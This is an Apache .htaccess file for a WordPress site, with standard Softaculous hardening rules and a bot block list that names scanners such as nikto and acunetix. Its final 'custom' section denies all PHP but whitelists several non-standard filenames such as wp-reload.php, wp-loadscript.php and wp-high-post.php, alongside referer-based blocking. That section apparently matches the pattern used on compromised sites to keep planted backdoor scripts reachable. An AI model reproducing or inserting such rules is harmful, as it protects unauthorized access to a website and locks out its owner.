# BEGIN LSCACHE
# END LSCACHE

# BEGIN NON_LSCACHE
# END NON_LSCACHE

# SOFTACULOUS Block author scans
RewriteEngine On
RewriteBase /
RewriteCond %{QUERY_STRING} (author=\d+) [NC,OR]
RewriteCond %{REQUEST_URI} ^.*wp-json/wp/v2/(users) [NC]
RewriteRule .* - [F]
# SOFTACULOUS Block author scans End

# BEGIN WordPress
RewriteEngine On
RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
RewriteBase /
RewriteRule ^index\.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L]
# END WordPress

# SOFTACULOUS Block xmlrpc
<Files xmlrpc.php>
	Require all denied
</Files>
# SOFTACULOUS Block xmlrpc End

# SOFTACULOUS Block .htaccess and .htpasswd
<FilesMatch ^(?i:\.ht.*)$>
	Require all denied
</FilesMatch>
# SOFTACULOUS Block .htaccess and .htpasswd End

# SOFTACULOUS Block directory browsing
Options -Indexes
# SOFTACULOUS Block directory browsing End

# SOFTACULOUS Block access sensitive files
<FilesMatch "^.*(((?:wp-config)\.(?:php|bak|swp))|php.ini|\.[hH][tT][aApP].*|((?:error_log|readme|license|changelog|-config|-sample)\.(?:php|md|log|txt|htm|html)))$">
	Require all denied
</FilesMatch>
# SOFTACULOUS Block access sensitive files End

# SOFTACULOUS Enable bot protection
RewriteCond %{HTTP_USER_AGENT} (?:virusbot|spambot|evilbot|acunetix|BLEXBot|domaincrawler\.com|LinkpadBot|MJ12bot/v|majestic12\.co\.uk|AhrefsBot|TwengaBot|SemrushBot|nikto|winhttp|Xenu\s+Link\s+Sleuth|Baiduspider|HTTrack|clshttp|harvest|extract|grab|miner|python-requests) [NC]
RewriteRule ^(.*)$ http://no.access/
# SOFTACULOUS Enable bot protection End

# Block direct PHP access except allowed files (custom rule from user)
<FilesMatch "\.(?:php|pHp|pht|phtml|phtm|php5|php72|phar|pgif|inc|sht|shtm|shtml|PHP|Php|PhP|PHp|pHP|phP|PHTML|Phtml|PHtml|PhTml|PhtMl|PhtmL|pHtml|pHTml|pHtMl|pHtmL|phTml|phTMl|phTmL|phtMl|phtML|PHT|Pht|PHt|PhT|pHt|pHT)$">
	Order allow,deny
	Deny from all
</FilesMatch>

<FilesMatch "^(index.php|wp-login.php|wp-admin.php|wp-blog-activated.php|error_log.php|wp-mail-activated.php|wp-loadscript.php|wp-reload.php|wp-high-post.php|wp-blog-reload.php|wp-log-style.php|class-wp-reload.php|wp-signin.php|wp-sample-config.php|class-wp-rest-comment.php|wp-rules.php)$">
	Order allow,deny
	Allow from all
</FilesMatch>

# Referer-based blocking of direct PHP access
RewriteCond %{HTTP_REFERER} !^http://360degree.biz.id/.*$ [NC]
RewriteCond %{HTTP_REFERER} !^http://360degree.biz.id$ [NC]
RewriteCond %{HTTP_REFERER} !^http://www.360degree.biz.id/.*$ [NC]
RewriteCond %{HTTP_REFERER} !^http://www.360degree.biz.id$ [NC]
RewriteCond %{HTTP_REFERER} !^https://360degree.biz.id/.*$ [NC]
RewriteCond %{HTTP_REFERER} !^https://360degree.biz.id$ [NC]
RewriteCond %{HTTP_REFERER} !^https://www.360degree.biz.id/.*$ [NC]
RewriteCond %{HTTP_REFERER} !^https://www.360degree.biz.id$ [NC]
RewriteRule .*\.(php|pHp|pht|phtml|phtm|php5|php72|phar|pgif|inc|sht|shtm|shtml|PHP|Php|PhP|PHp|pHP|phP|PHTML|Phtml|PHtml|PhTml|PhtMl|PhtmL|pHtml|pHTml|pHtMl|pHtmL|phTml|phTMl|phTmL|phtMl|phtML|PHT|Pht|PHt|PhT|pHt|pHT)$ - [F,NC]

# php -- BEGIN cPanel-generated handler, do not edit
# Set the “ea-php81” package as the default “PHP” programming language.
<IfModule mime_module>
  AddHandler application/x-httpd-ea-php81___lsphp .php .php8 .phtml
</IfModule>
# php -- END cPanel-generated handler, do not edit
